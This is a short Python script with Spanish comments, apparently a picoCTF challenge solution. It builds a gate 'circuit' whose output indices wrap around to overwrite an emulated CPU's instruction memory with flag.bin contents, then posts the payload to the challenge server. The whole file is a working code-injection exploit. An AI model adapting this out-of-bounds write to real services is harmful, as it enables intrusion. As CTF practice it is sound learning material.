import struct
import json
import requests

# 1. Leer las instrucciones que activan la Flag 2
try:
    with open('server/programs/flag.bin', 'rb') as f:
        flag_bin = f.read()
except FileNotFoundError:
    print("Error: Asegúrate de ejecutar este script en el mismo directorio donde extrajiste server.tar")
    exit(1)

# Convertir los 24 bytes en 12 palabras de 16 bits (Little-Endian)
words = struct.unpack(f'<{len(flag_bin)//2}H', flag_bin)

circuit = []
node_id = 2048 # Desplazamiento base de nuestro circuito en la memoria (0x3000)

# 2. Inyectar flag.bin en la memoria ejecutiva de la CPU (Dirección 0x0000)
# Escribimos el código repetidamente para asegurar que el Program Counter caiga en él
for target_word in range(128):
    val = words[target_word % len(words)]
    target_node = (65536 - 4096 + target_word) % 65536 # Offset para llegar a 0x0000
    
    # Compuerta A: Almacena el valor literal en la memoria del circuito
    circuit.append({"input1": val, "input2": val, "output": 1000})
    val_node = node_id
    node_id += 3
    
    # Compuerta B: NOT(val) -> Lo guardamos en un nodo temporal seguro (1001)
    circuit.append({"input1": val_node, "input2": val_node, "output": 1001})
    node_id += 3
    
    # Compuerta C: NOT(NOT(val)) -> Escribe el valor original en la instrucción de la CPU
    circuit.append({"input1": 1001, "input2": 1001, "output": target_node})
    node_id += 3

print("[*] Payload malicioso ensamblado. Disparando exploit...")

# 3. Enviar el circuito al servidor
url = "http://activist-birds.picoctf.net:53090/check"
response = requests.post(url, json={"circuit": circuit})

print("[*] Respuesta del servidor:")
print(response.json())
